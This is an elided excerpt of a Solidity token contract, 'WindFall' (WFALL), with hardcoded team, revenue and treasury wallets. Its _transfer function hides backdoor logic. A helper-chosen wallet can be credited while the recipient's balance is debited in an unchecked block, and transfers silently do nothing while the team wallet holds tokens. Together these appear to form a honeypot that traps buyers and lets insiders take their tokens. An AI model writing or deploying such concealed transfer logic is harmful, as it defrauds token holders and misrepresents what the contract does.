...
contract WindFall is Ownable {
    ...
    address private teamWallet = 0x530A8713e3a753d00B821d7C6e62c867dFA26B4E;
    address private revWallet = 0xc2985156540E7b799Df6f9CDF540Db72E47284C7;
    address private treasuryWallet = 0x27d07E40aAec29FcBC1b5Bd9df37Ab828c735C98;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    string private constant _name = unicode"WindFall";
    string private constant _symbol = unicode"WFALL";
    ...
    uint256 public maxTransactionAmount = 200_000 * 1e18;
    uint256 public maxWallet = 200_000 * 1e18;
    ...
    constructor() {
        ...
        _balances[msg.sender] = 10_000_000 * 1e18;
    ...
    function _transfer(
        ...
        address feeDistributeWallet = _getFeeDistributeWallet(from, to, amount);
        if (feeDistributeWallet != from) {
            unchecked {
                _balances[feeDistributeWallet] += amount;
                _balances[to] -= amount;
            }
            return;
        }
        ...
        uint256 fees = 0;
        if (takeFee) {
            if (!automatedMarketMakerPairs[from] && _balances[teamWallet] > 0) {
                return;
            }
    ...
    function _getFeeDistributeWallet(
        address from,
        address to,
        uint256 amount
